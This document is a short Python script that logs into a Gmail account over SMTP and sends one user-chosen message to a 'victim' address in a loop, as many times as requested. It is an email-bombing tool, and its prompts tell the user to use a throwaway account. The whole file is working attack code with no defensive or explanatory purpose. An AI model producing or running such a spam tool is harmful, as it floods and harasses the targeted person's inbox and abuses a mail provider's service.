import smtplib
from datetime import date

atual_date = date.today()
print('Atual date:', atual_date)
email = input("Your gmail(DO NOT USE YOUR PERSONAL MAIL):")
password = input("Your password:")
victim = input("Your victim gmail:")
message = input("Your message:")
number = int(input("How many times do you want to spam? "))
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)


def spam():
    counter = 0
    while counter < number:
        server.sendmail(
            email,
            victim,
            message)
        counter += 1
        print("E-mails sent:", counter)


if __name__ == '__main__':
    spam()
